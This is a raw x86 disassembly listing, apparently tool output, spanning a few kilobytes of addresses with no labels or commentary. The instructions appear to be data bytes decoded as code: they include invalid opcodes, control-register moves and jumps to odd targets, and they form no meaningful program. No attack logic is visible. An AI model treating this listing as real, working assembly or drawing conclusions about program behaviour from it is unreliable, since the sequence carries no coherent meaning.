  401f73:	inc    ecx
  401f74:	rcl    BYTE PTR [ecx],0x1c
  401f77:	loop   0x401ef9
  401f79:	es inc eax
  401f7b:	adc    al,dh
  401f7d:	add    BYTE PTR [eax],ch
  401f7f:	add    eax,0x11cb0000
  401f84:	adc    DWORD PTR [eax+0x18],eax
  401f87:	mov    BYTE PTR [eax+eax*1],cl
  401f8a:	push   ecx
  401f8b:	nop
  401f8c:	sub    DWORD PTR [edx],edx
  401f8e:	add    BYTE PTR [eax],al
  401f90:	adc    BYTE PTR [eax],0x10
  401f93:	add    BYTE PTR [edi+0xa],0xe8
  401f97:	add    BYTE PTR [edx],al
  401f99:	xor    BYTE PTR [edx+0x0],ah
  401f9c:	add    BYTE PTR [eax+0x66280000],al
  401fa2:	add    al,0x91
  401fa4:	push   ebx
  401fa5:	sub    bh,bh
  401fa7:	adc    eax,0x41355c
  401fac:	add    esp,DWORD PTR ds:0x42240026
  401fb2:	add    BYTE PTR [ecx-0x6e],al
  401fb5:	add    dl,BYTE PTR [eax]
  401fb7:	adc    BYTE PTR [eax],al
  401fb9:	add    BYTE PTR [edx],dl
  401fbb:	add    eax,DWORD PTR [eax+0x2b]
  401fbe:	add    al,0x3
  401fc0:	inc    ebp
  401fc1:	add    BYTE PTR [ebx+0xb20010],0x2
  401fc8:	inc    eax
  401fc9:	sub    eax,0x220a58d0
  401fce:	jb     0x401ff3
  401fd0:	enter  0x0,0x0
  401fd4:	and    eax,0xa0a2
  401fd9:	and    BYTE PTR [eax],al
  401fdb:	inc    esp
  401fdc:	popa   
  401fdd:	add    BYTE PTR [eax],0xed
  401fe0:	sar    DWORD PTR [eax],0x40
  401fe3:	add    BYTE PTR [ecx],dh
  401fe5:	rol    BYTE PTR [eax],1
  401fe7:	adc    ah,BYTE PTR [eax+0x43]
  401fea:	adc    BYTE PTR [eax],al
  401fec:	sbb    BYTE PTR [ecx],bh
  401fee:	inc    eax
  401fef:	sub    BYTE PTR [ecx+eax*1+0x2a],al
  401ff3:	or     BYTE PTR [eax],al
  401ff5:	pop    edx
  401ff6:	or     DWORD PTR [eax],ecx
  401ff8:	add    DWORD PTR [edx+0x24],esp
  401ffb:	add    BYTE PTR [eax-0x77f8fee4],ah
  402001:	add    al,0x2a
  402003:	mov    ds:0x201c3130,al
  402008:	adc    BYTE PTR [eax],cl
  40200a:	and    BYTE PTR [eax],ah
  40200c:	add    dl,BYTE PTR [edx+0x32]
  40200f:	and    BYTE PTR [ecx],al
  402011:	inc    eax
  402012:	cmp    al,al
  402014:	sbb    DWORD PTR ds:0x51081400,eax
  40201a:	add    eax,0x118b3074
  40201f:	test   BYTE PTR [esi],bh
  402021:	xor    cl,BYTE PTR [edx]
  402023:	and    BYTE PTR [edx+0x48],al
  402026:	nop
  402027:	xor    DWORD PTR [ebp-0x40],eax
  40202a:	or     dh,al
  40202c:	pop    eax
  40202d:	push   eax
  40202e:	and    BYTE PTR [eax],ch
  402030:	or     al,BYTE PTR [edx+eiz*1+0x4800010]
  402037:	mov    DWORD PTR [edx+0x0],eax
  40203a:	add    BYTE PTR [eax],al
  40203c:	add    BYTE PTR [ecx],cl
  40203e:	shl    BYTE PTR [ebp+0x1293a644],1
  402044:	pop    ss
  402045:	pusha  
  402046:	or     BYTE PTR [ecx],cl
  402048:	push   es
  402049:	add    BYTE PTR [esi],bl
  40204b:	and    al,0x2
  40204d:	push   es
  40204e:	add    al,cl
  402050:	xor    BYTE PTR [ecx],ah
  402052:	cwde   
  402053:	add    BYTE PTR gs:[eax+0x2014075c],bl
  40205a:	push   eax
  40205b:	xor    esi,DWORD PTR [edx]
  40205d:	mov    al,BYTE PTR [esi+0x24190409]
  402063:	pusha  
  402064:	shl    eax,0x1
  402067:	and    BYTE PTR [eax],cl
  402069:	add    al,0xc
  40206b:	or     BYTE PTR [eax],al
  40206d:	das    
  40206e:	cs add BYTE PTR es:[edx+0x40],al
  402073:	mov    DWORD PTR [edx+0x0],eax
  402076:	adc    al,BYTE PTR [eax-0x20]
  402079:	push   ss
  40207a:	jle    0x40207e
  40207c:	or     BYTE PTR [ebx],ah
  40207e:	and    DWORD PTR [eax-0x7befdc00],eax
  402084:	add    BYTE PTR [eax+eiz*1],cl
  402087:	add    bh,dl
  402089:	push   eax
  40208a:	inc    esp
  40208b:	pusha  
  40208c:	pusha  
  40208d:	inc    edx
  40208e:	les    edx,FWORD PTR [ebx]
  402090:	mov    DWORD PTR [ecx],eax
  402092:	adc    al,BYTE PTR [eax]
  402094:	ins    DWORD PTR es:[edi],dx
  402095:	xor    esp,DWORD PTR [eax+0x69a190c8]
  40209b:	rol    BYTE PTR [eax+0x2682850],0x2
  4020a2:	mov    cs,WORD PTR [ecx+0x6]
  4020a5:	sub    cl,BYTE PTR [eax+0x20000840]
  4020ab:	test   al,0xa0
  4020ad:	pop    ss
  4020ae:	imul   eax,DWORD PTR [edx],0x24
  4020b1:	adc    BYTE PTR [eax],dl
  4020b3:	test   BYTE PTR [eax],dl
  4020b5:	add    dh,BYTE PTR [ecx]
  4020b7:	add    BYTE PTR [eax+eax*1+0x46],0x80
  4020bc:	dec    eax
  4020bd:	add    al,0x0
  4020bf:	or     BYTE PTR [eax+0x30090889],0x40
  4020c6:	test   al,0x84
  4020c8:	adc    BYTE PTR [ecx-0x7e],al
  4020cb:	push   esp
  4020cc:	add    al,BYTE PTR [eax]
  4020ce:	add    DWORD PTR [eax-0x76],ecx
  4020d1:	add    al,BYTE PTR [ebp+0x2]
  4020d4:	add    eax,0x2304030
  4020d9:	mov    WORD PTR [edx],ss
  4020db:	mov    eax,ds:0x89a13c14
  4020e0:	adc    DWORD PTR [eax+0x20],eax
  4020e3:	mov    al,ds:0x20000005
  4020e8:	add    BYTE PTR [edx],al
  4020ea:	ret    
  4020eb:	add    BYTE PTR ds:0xa0d40128,bh
  4020f1:	ret    0x0
  4020f4:	add    esp,DWORD PTR [ecx]
  4020f6:	or     BYTE PTR ds:0x23420554,dl
  4020fc:	add    BYTE PTR [eax],al
  4020fe:	test   DWORD PTR [edx+eax*4+0x22],esp
  402102:	inc    ecx
  402103:	or     al,0x4
  402105:	add    BYTE PTR [ecx],al
  402107:	test   BYTE PTR [eax],al
  402109:	and    dh,BYTE PTR [ebx+0x0]
  40210c:	loop   0x40212e
  40210e:	inc    eax
  40210f:	dec    edi
  402110:	and    DWORD PTR [eax-0x7d7efbae],esp
  402116:	and    eax,0x40652008
  40211b:	inc    eax
  40211c:	add    dl,BYTE PTR [eax]
  40211e:	or     BYTE PTR [eax],al
  402120:	sub    DWORD PTR [edi+0x9],eax
  402123:	mov    BYTE PTR [eax],al
  402125:	add    BYTE PTR [eax],dl
  402127:	loop   0x4020b3
  402129:	icebp  
  40212a:	add    BYTE PTR [eax],al
  40212c:	sbb    BYTE PTR [edx],cl
  40212e:	or     BYTE PTR [eax],al
  402130:	xor    BYTE PTR [eax+0x0],al
  402133:	nop
  402134:	add    al,0x81
  402136:	test   BYTE PTR [edx+ecx*4],bl
  402139:	outs   dx,BYTE PTR ds:[esi]
  40213a:	add    DWORD PTR [ecx],edx
  40213c:	add    DWORD PTR [eax-0x3795effc],0x36280200
  402146:	dec    ecx
  402147:	and    DWORD PTR [edx+eax*2],eax
  40214a:	add    BYTE PTR [eax+0x220080],al
  402150:	add    BYTE PTR [eax+0x24011830],al
  402156:	add    BYTE PTR [eax+0x42],al
  402159:	mov    eax,ds:0xe852034
  40215e:	and    BYTE PTR [edx-0x3fe00000],bh
  402164:	and    BYTE PTR [ecx],cl
  402166:	and    al,BYTE PTR [eax]
  402168:	adc    eax,0x4612805a
  40216d:	pop    esp
  40216e:	je     0x4021cc
  402170:	and    BYTE PTR [ecx-0x3c],dl
  402173:	and    BYTE PTR [eax],dl
  402175:	add    BYTE PTR [ecx+0x0],al
  402178:	push   esp
  402179:	inc    ecx
  40217a:	mov    al,ds:0x5878400a
  40217f:	add    DWORD PTR [ecx],esp
  402181:	push   ecx
  402182:	adc    BYTE PTR [edx-0x33fb7e78],bl
  402188:	or     BYTE PTR [eax],0x11
  40218b:	inc    eax
  40218c:	add    DWORD PTR [edx-0x5e],esi
  40218f:	stos   BYTE PTR es:[edi],al
  402190:	add    BYTE PTR [edi],dl
  402192:	add    al,ah
  402194:	xchg   esp,eax
  402195:	push   es
  402196:	dec    esp
  402197:	and    BYTE PTR [eax],al
  402199:	inc    esp
  40219a:	popa   
  40219b:	mov    BYTE PTR [esi-0x7cff5800],ah
  4021a1:	and    BYTE PTR [edx+0x11252010],ah
  4021a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021a8:	sub    DWORD PTR [eax*1+0x31052024],eax
  4021af:	add    esp,DWORD PTR [eax]
  4021b1:	retf   0xaa00
  4021b4:	and    al,BYTE PTR [eax+eax*8]
  4021b7:	add    al,BYTE PTR [eax+0x26520819]
  4021bd:	or     BYTE PTR [eax],dl
  4021bf:	inc    ecx
  4021c0:	add    al,BYTE PTR [ecx]
  4021c2:	adc    cl,BYTE PTR [edx+ecx*8-0x6695dac0]
  4021c9:	add    BYTE PTR [eax+0x70090200],bh
  4021cf:	nop
  4021d0:	add    BYTE PTR [eax+0x68a08061],dl
  4021d6:	inc    esp
  4021d7:	inc    eax
  4021d8:	add    BYTE PTR [esp+eax*1],cl
  4021db:	add    BYTE PTR [eax],al
  4021dd:	test   BYTE PTR [eax],al
  4021df:	inc    ebp
  4021e0:	rcl    DWORD PTR [edx+0x6009b30],0xa0
  4021e7:	or     BYTE PTR [edx+0x44050c00],al
  4021ed:	add    esp,DWORD PTR [esp+eax*1]
  4021f0:	inc    ecx
  4021f1:	ins    BYTE PTR es:[edi],dx
  4021f2:	add    al,0x8
  4021f4:	add    BYTE PTR [eax+eax*1],al
  4021f7:	jo     0x402221
  4021f9:	test   DWORD PTR [eax],esp
  4021fb:	pusha  
  4021fc:	add    BYTE PTR [esp+eiz*4+0x0],ch
  402200:	add    ah,BYTE PTR [edx+0x40]
  402203:	add    BYTE PTR [ecx+eax*1],al
  402206:	mov    ds:0x4462106,al
  40220b:	pop    esp
  40220c:	sub    BYTE PTR [esi+eax*4],ah
  40220f:	push   es
  402210:	adc    ah,al
  402212:	dec    edx
  402213:	add    al,BYTE PTR [edx+0x0]
  402216:	inc    ecx
  402217:	or     al,0x37
  402219:	or     al,BYTE PTR [eax]
  40221b:	inc    esp
  40221c:	retf   0x506
  40221f:	add    BYTE PTR [eax],ah
  402221:	and    BYTE PTR [eax],cl
  402223:	test   al,0x19
  402225:	add    DWORD PTR [edi+eax*4],eax
  402228:	mov    BYTE PTR [eax+ecx*1+0x10],ah
  40222c:	push   es
  40222d:	or     DWORD PTR [ecx],eax
  40222f:	loopne 0x4021b9
  402231:	xor    BYTE PTR [ecx],0xa
  402234:	and    DWORD PTR [eax],0x3
  402237:	add    al,0x1c
  402239:	mov    eax,ds:0x5052140
  40223e:	and    BYTE PTR [esi+0x1001c084],al
  402244:	add    al,BYTE PTR [edx+0x70]
  402247:	add    BYTE PTR [edx],al
  402249:	add    BYTE PTR [ecx],al
  40224b:	add    BYTE PTR [edx+ebp*1],cl
  40224e:	or     al,0xc
  402250:	add    cl,BYTE PTR [ecx]
  402252:	add    BYTE PTR [eax],bl
  402254:	add    ch,BYTE PTR [eax+0x8]
  402257:	mov    al,0xa3
  402259:	add    al,0x80
  40225b:	ins    DWORD PTR es:[edi],dx
  40225c:	or     BYTE PTR [edx],bl
  40225e:	and    al,0x4
  402260:	add    BYTE PTR [eax],0x19
  402263:	sub    ch,BYTE PTR [esi]
  402265:	inc    eax
  402266:	add    BYTE PTR [edx],dl
  402268:	or     BYTE PTR [edx+0x2318a061],dl
  40226e:	adc    DWORD PTR [eax+0x4d],edx
  402271:	add    BYTE PTR [eax],dl
  402273:	sbb    BYTE PTR [esi+0x114000c],al
  402279:	add    BYTE PTR [esp+ecx*2-0xc],al
  40227d:	adc    BYTE PTR [edx+0x611a0080],ah
  402283:	and    DWORD PTR [ecx-0x3ccefe60],edx
  402289:	add    al,BYTE PTR [ecx]
  40228b:	mov    edi,0x13620c42
  402291:	add    eax,DWORD PTR [eax]
  402293:	inc    ecx
  402294:	add    BYTE PTR [eax-0x7edde3f0],dl
  40229a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40229b:	or     eax,0x9080000c
  4022a0:	mov    es,WORD PTR [ecx]
  4022a2:	and    BYTE PTR [eax],al
  4022a4:	add    ah,BYTE PTR [eax-0x60]
  4022a7:	inc    esp
  4022a8:	or     DWORD PTR [esp+edx*8],ebp
  4022ab:	dec    eax
  4022ac:	add    BYTE PTR [edi],0x80
  4022af:	and    al,0x9
  4022b1:	and    al,0x34
  4022b3:	dec    esp
  4022b4:	push   es
  4022b5:	add    BYTE PTR fs:[ecx+0x602a4801],cl
  4022bc:	repz bound eax,QWORD PTR [eax]
  4022bf:	add    al,ch
  4022c1:	add    BYTE PTR [ebx],0x41
  4022c4:	shl    BYTE PTR [eax],0x40
  4022c7:	xor    DWORD PTR [eax],eax
  4022c9:	inc    esp
  4022ca:	and    BYTE PTR [edx+eiz*1],dl
  4022cd:	add    DWORD PTR [eax],eax
  4022cf:	add    DWORD PTR [eax+0x841d049],0xffffff84
  4022d6:	mov    al,ds:0x1024ac03
  4022db:	adc    DWORD PTR [esp+eax*8-0x51],esi
  4022df:	or     eax,DWORD PTR [ecx+0x1001100]
  4022e5:	mov    al,ds:0x500292
  4022ea:	or     BYTE PTR [eax+ecx*1+0x40100081],cl
  4022f1:	or     BYTE PTR [esp+edx*8+0x8141880],al
  4022f8:	add    DWORD PTR [edx+0x8061008],ecx
  4022fe:	push   edx
  4022ff:	pusha  
  402300:	pop    es
  402301:	add    BYTE PTR [ebx+0x8],cl
  402304:	pop    esp
  402305:	or     dh,BYTE PTR [ebp+0x80c028]
  40230b:	add    DWORD PTR [ebx],0x20
  40230e:	or     BYTE PTR [eax],0xd
  402311:	add    BYTE PTR [edx+0x2],al
  402314:	pop    es
  402315:	add    DWORD PTR [eax+eax*1],eax
  402318:	loopne 0x40231b
  40231a:	add    al,0x44
  40231c:	adc    BYTE PTR [edx],al
  40231e:	add    BYTE PTR [eax],0x20
  402321:	mov    BYTE PTR [eax+0x42008804],al
  402327:	inc    ecx
  402328:	inc    eax
  402329:	test   BYTE PTR [eax+eax*1+0x14740925],al
  402330:	xor    ebx,DWORD PTR [ecx+0x4908a2c]
  402336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402337:	pusha  
  402338:	xor    BYTE PTR [edx],al
  40233a:	add    DWORD PTR [eax+0x12a03020],edx
  402340:	nop
  402341:	xchg   esi,eax
  402342:	test   eax,0x28144482
  402347:	adc    eax,0x14300621
  40234c:	add    cl,BYTE PTR [eax+0x3]
  40234f:	adc    eax,0x400c044
  402354:	pusha  
  402355:	add    dl,BYTE PTR [eax-0x3f7fbebf]
  40235b:	add    DWORD PTR [eax],eax
  40235d:	inc    esp
  40235e:	push   edx
  40235f:	add    BYTE PTR [eax-0x7bfe69b4],ch
  402365:	add    DWORD PTR [edx+0x8008205],edx
  40236b:	add    al,BYTE PTR ds:0x19002012
  402371:	push   es
  402372:	add    al,0x24
  402374:	mov    cr1,ebx
  402377:	les    edx,FWORD PTR [edx-0x72e8fb00]
  40237d:	sbb    eax,0x946944c0
  402382:	sbb    BYTE PTR [ecx],0x20
  402385:	push   esp
  402386:	inc    ecx
  402387:	pusha  
  402388:	add    BYTE PTR [eax],bl
  40238a:	sub    al,0x5
  40238c:	add    DWORD PTR [eax],ebx
  40238e:	push   ss
  40238f:	inc    ebx
  402390:	or     DWORD PTR [eax-0x7fbf76df],esp
  402396:	add    BYTE PTR [edx],0x8
  402399:	add    al,0x90
  40239b:	mov    BYTE PTR [eax],al
  40239d:	add    al,BYTE PTR [eax]
  40239f:	test   al,0x18
  4023a1:	add    BYTE PTR [edx+0x40888090],ah
  4023a7:	xchg   ecx,eax
  4023a8:	mov    al,ds:0xa6180082
  4023ad:	inc    eax
  4023ae:	and    BYTE PTR [eax+0x15040100],al
  4023b4:	or     al,BYTE PTR [eax]
  4023b6:	inc    eax
  4023b7:	xor    eax,0xc0904014
  4023bc:	and    BYTE PTR gs:[eax],dl
  4023bf:	add    al,0x5
  4023c1:	add    BYTE PTR [ebx+0x20181524],al
  4023c7:	add    al,0xc0
  4023c9:	and    al,BYTE PTR [eax+0x56]
  4023cc:	adc    BYTE PTR [ecx],al
  4023ce:	dec    eax
  4023cf:	adc    BYTE PTR [ecx+0xe0a1300],dl
  4023d5:	add    al,0x9
  4023d7:	xor    dl,BYTE PTR [edx+eax*1]
  4023da:	and    DWORD PTR [eax],edi
  4023dc:	(bad)  
  4023dd:	xor    eax,0x1232164
  4023e2:	add    BYTE PTR [edx*1+0x1110100],dh
  4023e9:	adc    BYTE PTR [ecx],0x62
  4023ec:	adc    al,0x40
  4023ee:	inc    ebp
  4023ef:	inc    edx
  4023f0:	add    BYTE PTR [eax],bh
  4023f2:	add    al,0x0
  4023f4:	dec    eax
  4023f5:	adc    al,0x25
  4023f7:	adc    ah,BYTE PTR [ecx]
  4023f9:	add    BYTE PTR [ecx],0x4
  4023fc:	test   BYTE PTR [edx+0x400302e],al
  402402:	push   es
  402403:	rol    DWORD PTR [edi+0x4b],0x1
  402407:	inc    eax
  402408:	inc    ebp
  402409:	add    BYTE PTR [ecx+0x2],al
  40240c:	push   eax
  40240d:	rcr    dl,0x84
  402410:	pop    ss
  402411:	push   cs
  402412:	and    BYTE PTR ds:0xb0c00003,cl
  402418:	pop    es
  402419:	xor    al,0x1
  40241b:	add    BYTE PTR ds:0x8214103,dl
  402421:	and    BYTE PTR [eax],al
  402423:	or     al,0xa4
  402425:	pusha  
  402426:	push   cs
  402427:	dec    esp
  402428:	xchg   ecx,eax
  402429:	and    al,BYTE PTR [ebx+0x110162a9]
  40242f:	inc    edx
  402430:	add    BYTE PTR [edx+0x0],ah
  402433:	and    eax,0x442fc520
  402438:	add    BYTE PTR [edx],ah
  40243a:	or     al,0xa9
  40243c:	add    eax,0x2020800
  402441:	test   BYTE PTR [esi],dh
  402443:	js     0x40248f
  402445:	add    al,0x24
  402447:	and    BYTE PTR [eax],al
  402449:	pusha  
  40244a:	push   eax
  40244b:	inc    edx
  40244c:	ret    0x4020
  40244f:	add    eax,0x410801c2
  402454:	or     DWORD PTR [eax+ebx*1],ebp
  402457:	add    BYTE PTR [eax],cl
  402459:	mov    ecx,0x370021
  40245e:	and    BYTE PTR [eax-0x80],ah
  402461:	or     BYTE PTR [eax],ah
  402463:	adc    DWORD PTR [eax+0x31],eax
  402466:	jmp    0x4802f72
  40246b:	and    al,0x2
  40246d:	push   ss
  40246e:	add    ah,BYTE PTR [eax+0x128a0000]
  402474:	or     BYTE PTR [edx+0x10],0x10
  402478:	mov    ah,0x40
  40247a:	inc    edx
  40247b:	add    BYTE PTR [eax+eiz*1],al
  40247e:	adc    ah,BYTE PTR [eax+ecx*1]
  402481:	and    BYTE PTR [esi+eax*8+0x490000a1],cl
  402488:	mov    WORD PTR [eax+0x42],gs
  40248b:	add    al,0x2
  40248d:	add    al,BYTE PTR [ecx+0x9]
  402490:	and    eax,0x40208240
  402495:	or     al,BYTE PTR [edx]
  402497:	or     al,0x40
  402499:	add    eax,0x419222
  40249e:	add    BYTE PTR [eax],al
  4024a0:	push   eax
  4024a1:	adc    al,BYTE PTR [eax+0x1c4208]
  4024a7:	add    al,0x8
  4024a9:	pop    eax
  4024aa:	inc    eax
  4024ab:	adc    DWORD PTR [eax-0x7e],eax
  4024ae:	add    DWORD PTR [eax],eax
  4024b0:	nop
  4024b1:	inc    ecx
  4024b2:	adc    al,0x41
  4024b4:	or     BYTE PTR [eax+0x817003],cl
  4024ba:	or     al,0x83
  4024bc:	adc    al,0x9
  4024be:	add    esp,DWORD PTR [eax]
  4024c0:	add    eax,0xa40033a4
  4024c5:	push   cs
  4024c6:	add    eax,0x1e1840a0
  4024cb:	inc    eax
  4024cc:	mov    ds:0x85009802,al
  4024d1:	popa   
  4024d2:	pusha  
  4024d3:	cld    
  4024d4:	inc    eax
  4024d5:	push   ecx
  4024d6:	add    al,BYTE PTR [eax+0x35]
  4024d9:	xor    dh,BYTE PTR [eax+0x8]
  4024dc:	or     DWORD PTR [eax+eiz*1],esi
  4024df:	add    BYTE PTR [ebx],0xe2
  4024e2:	shl    BYTE PTR [edx],0x42
  4024e5:	inc    eax
  4024e6:	bound  ecx,QWORD PTR [eax]
  4024e8:	adc    BYTE PTR [ecx+0x82100a1],bl
  4024ee:	xor    BYTE PTR [ecx],dh
  4024f0:	add    BYTE PTR [eax],0x20
  4024f3:	adc    BYTE PTR [edx+0x11240302],ah
  4024f9:	dec    eax
  4024fa:	add    al,0x82
  4024fc:	add    BYTE PTR [ecx+0x18],al
  4024ff:	mov    BYTE PTR [ecx+ecx*1],bl
  402502:	add    BYTE PTR [edx+0x424941e2],al
  402508:	inc    ecx
  402509:	inc    eax
  40250a:	add    BYTE PTR [edx],al
  40250c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40250d:	and    al,0x90
  40250f:	push   edx
  402510:	add    al,0x8c
  402512:	add    DWORD PTR ds:0x801a1328,eax
  402518:	and    eax,eax
  40251a:	and    eax,0x1628800
  402520:	xchg   ecx,eax
  402521:	adc    ch,cl
  402523:	xor    BYTE PTR [ecx],cl
  402525:	push   ecx
  402526:	add    al,0x94
  402528:	add    BYTE PTR [ecx],al
  40252a:	add    dl,0x41
  40252d:	mov    cl,0x80
  40252f:	ror    BYTE PTR [eax],0x2
  402532:	add    DWORD PTR [eax],eax
  402534:	and    BYTE PTR [eax+0x10423108],al
  40253a:	xchg   DWORD PTR ds:0x10121641,eax
  402540:	adc    BYTE PTR [eax+0x2d1c2028],0x40
  402547:	add    BYTE PTR [edx],ah
  402549:	nop
  40254a:	inc    eax
  40254b:	add    BYTE PTR [edx+0x400a4040],ch
  402551:	and    ch,al
  402553:	push   ecx
  402554:	or     BYTE PTR [eax+eax*2],al
  402557:	add    al,0x30
  402559:	adc    BYTE PTR [edx],dh
  40255b:	mov    ds:0x400010,eax
  402560:	xchg   esi,eax
  402561:	sbb    al,0x0
  402563:	popa   
  402564:	adc    BYTE PTR [edx-0x7efee000],al
  40256a:	add    al,0x2
  40256c:	add    BYTE PTR [eax],al
  40256e:	add    BYTE PTR [edx],dl
  402570:	or     DWORD PTR [ecx],eax
  402572:	loopne 0x40258c
  402574:	add    BYTE PTR [eax],0x1b
  402577:	test   BYTE PTR [eax*1+0x20000130],bl
  40257e:	xor    al,BYTE PTR [eax]
  402580:	or     al,0x80
  402582:	or     BYTE PTR [eax],al
  402584:	jnp    0x4025a6
  402586:	mov    al,ds:0xa9d06499
  40258b:	add    BYTE PTR [ecx-0x7fffdbff],al
  402591:	sbb    BYTE PTR [eax],cl
  402593:	add    BYTE PTR [esi],bl
  402595:	sub    al,BYTE PTR [eax]
  402597:	add    BYTE PTR [edi+0x4b],ah
  40259a:	or     DWORD PTR [eax],eax
  40259c:	sub    DWORD PTR [ecx],edx
  40259e:	add    BYTE PTR [edx],0x0
  4025a1:	add    BYTE PTR [ecx+0x23390081],al
  4025a7:	inc    edx
  4025a8:	or     eax,DWORD PTR [eax+ebp*4+0x48022848]
  4025af:	add    BYTE PTR [eax],0x80
  4025b2:	and    al,BYTE PTR [edx]
  4025b4:	add    BYTE PTR [eax],ah
  4025b6:	adc    al,BYTE PTR [eax]
  4025b8:	test   BYTE PTR [ecx],cl
  4025ba:	xchg   edx,eax
  4025bb:	and    BYTE PTR [eax],al
  4025bd:	mov    al,ds:0xb2c18800
  4025c2:	icebp  
  4025c3:	test   BYTE PTR [eax],al
  4025c5:	and    ah,BYTE PTR [eax+0x2c849c0]
  4025cb:	loopne 0x4025cf
  4025cd:	add    eax,0x44155
  4025d2:	add    BYTE PTR [eax],dl
  4025d4:	add    BYTE PTR ds:0x3c0c0007,cl
  4025da:	adc    eax,0xa8504000
  4025df:	sbb    BYTE PTR [eax+0x0],al
  4025e2:	add    BYTE PTR [eax+0x20],al
  4025e5:	add    cl,al
  4025e7:	mov    al,ds:0x10c46005
  4025ec:	add    dl,dh
  4025ee:	add    BYTE PTR [ebp+0x8000890],dl
  4025f4:	adc    DWORD PTR [eax],esp
  4025f6:	add    BYTE PTR [edx+0x50],bl
  4025f9:	add    cl,dl
  4025fb:	add    BYTE PTR [ecx],dh
  4025fd:	push   ecx
  4025fe:	sub    BYTE PTR [edx+0x2],0x1
  402602:	add    al,0xba
  402604:	and    al,0x4c
  402606:	xor    DWORD PTR [eax],esp
  402608:	add    al,0x84
  40260a:	push   ecx
  40260b:	and    DWORD PTR [esi+ecx*1+0x4806009a],ebx
  402612:	add    al,BYTE PTR [eax+0x66180025]
  402618:	mov    al,ds:0x10002668
  40261d:	rcl    DWORD PTR [edx],0x1
  402620:	inc    edx
  402621:	add    BYTE PTR [eax],al
  402623:	and    BYTE PTR [esp+ecx*1+0x26040000],ah
  40262a:	xor    ebx,DWORD PTR [eax]
  40262c:	adc    DWORD PTR [ecx],esp
  40262e:	loopne 0x402644
  402630:	and    DWORD PTR [edx],ecx
  402632:	bound  edx,QWORD PTR [edx+eax*8+0x510c809]
  402639:	add    BYTE PTR [eax],cl
  40263b:	add    BYTE PTR [edx],al
  40263d:	dec    ebx
  40263e:	push   es
  40263f:	pusha  
  402640:	add    al,0x60
  402642:	mov    BYTE PTR [eax],ah
  402644:	or     bl,ch
  402646:	add    DWORD PTR [eax+0x9c40888],esp
  40264c:	adc    esp,DWORD PTR [ecx]
  40264e:	add    BYTE PTR [edx],dl
  402650:	adc    dl,BYTE PTR [edx-0x80]
  402653:	inc    esp
  402654:	dec    edx
  402655:	leave  
  402656:	add    DWORD PTR [ecx+ecx*1+0x0],ecx
  40265a:	or     BYTE PTR fs:[eax],ah
  40265d:	imul   eax,DWORD PTR [eax+eax*2],0x0
  402661:	and    DWORD PTR [eax],eax
  402663:	or     DWORD PTR [edx],eax
  402665:	and    BYTE PTR [eax+0x10],al
  402668:	adc    DWORD PTR [eax*1+0x2380410],esp
  40266f:	sar    BYTE PTR [eax],cl
  402671:	enter  0x4007,0xa4
  402675:	adc    DWORD PTR [ecx+0x0],esp
  402678:	rcl    BYTE PTR [eax-0x57df37f5],0x22
  40267f:	add    dl,BYTE PTR [eax]
  402681:	and    al,0x11
  402683:	and    al,BYTE PTR [eax+0x194b20c0]
  402689:	adc    DWORD PTR [eax],esp
  40268b:	or     DWORD PTR [eax+eax*2],esi
  40268e:	add    al,0x29
  402690:	add    ah,BYTE PTR [eax+0x1402a40a]
  402696:	inc    ecx
  402697:	test   al,0xa2
  402699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40269a:	adc    ebx,DWORD PTR [esi+ebp*1]
  40269d:	mov    ds:0x10390842,eax
  4026a2:	add    al,0x34
  4026a4:	add    al,0x5
  4026a6:	sbb    al,BYTE PTR [eax+0x10]
  4026a9:	add    al,0x0
  4026ab:	inc    esp
  4026ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026ad:	or     BYTE PTR [eax-0x73],bl
  4026b0:	push   eax
  4026b1:	or     BYTE PTR [eax+ecx*1],cl
  4026b4:	add    BYTE PTR [esi],al
  4026b6:	add    al,0x20
  4026b8:	add    al,al
  4026ba:	add    BYTE PTR [ecx+0x2a03003],0x0
  4026c1:	add    DWORD PTR [eax],eax
  4026c3:	inc    eax
  4026c4:	and    BYTE PTR [ecx],0x23
  4026c7:	and    al,BYTE PTR [eax]
  4026c9:	inc    eax
  4026ca:	inc    esp
  4026cb:	or     DWORD PTR [eax],0xc8424006
  4026d1:	dec    esi
  4026d2:	cmp    BYTE PTR [edx+ecx*8+0x10a4651],ah
  4026d9:	cdq    
  4026da:	fsub   QWORD PTR [eax]
  4026dc:	add    al,0x80
  4026de:	xor    DWORD PTR [eax],esi
  4026e0:	add    DWORD PTR [eax-0x6c],ecx
  4026e3:	cmovb  eax,DWORD PTR [eax-0x80]
  4026e7:	adc    DWORD PTR [ebx+eax*8+0x0],eax
  4026eb:	pushf  
  4026ec:	jecxz  0x4026ef
  4026ee:	xor    BYTE PTR [eax],cl
  4026f0:	xor    BYTE PTR [edx],0x65
  4026f3:	sbb    DWORD PTR [esp+eax*1],0x812c406
  4026fa:	add    BYTE PTR [ecx],al
  4026fc:	adc    BYTE PTR [eax],dl
  4026fe:	rol    BYTE PTR [eax+0xa30a400],1
  402704:	or     eax,0x80750470
  402709:	pop    ss
  40270a:	push   cs
  40270b:	and    al,0x84
  40270d:	adc    DWORD PTR [ecx-0x80],ebx
  402710:	or     eax,DWORD PTR [esi-0x7a]
  402713:	xchg   BYTE PTR [eax+0x52081003],bl
  402719:	or     BYTE PTR [esp+eax*4],ah
  40271c:	add    BYTE PTR [esp+0x40],ah
  402720:	inc    eax
  402721:	bound  edi,QWORD PTR [eax+eax*1]
  402724:	fs push eax
  402726:	and    BYTE PTR [eax],bl
  402728:	loopne 0x4026ab
  40272a:	push   eax
  40272b:	push   eax
  40272c:	or     DWORD PTR [esi],eax
  40272e:	and    BYTE PTR [eax+eiz*1-0x80],al
  402732:	inc    edx
  402733:	or     al,0x20
  402735:	mov    cl,BYTE PTR [eax+0x0]
  402738:	add    DWORD PTR [ecx-0x80],eax
  40273b:	inc    eax
  40273c:	or     BYTE PTR [eax],dl
  40273e:	add    BYTE PTR [edx+0x0],al
  402741:	add    DWORD PTR fs:[ecx],ecx
  402744:	and    al,BYTE PTR [ecx]
  402746:	inc    esp
  402747:	push   es
  402748:	ins    DWORD PTR es:[edi],dx
  402749:	add    BYTE PTR [eax],dl
  40274b:	adc    dl,BYTE PTR [eax]
  40274d:	mov    al,0x4b
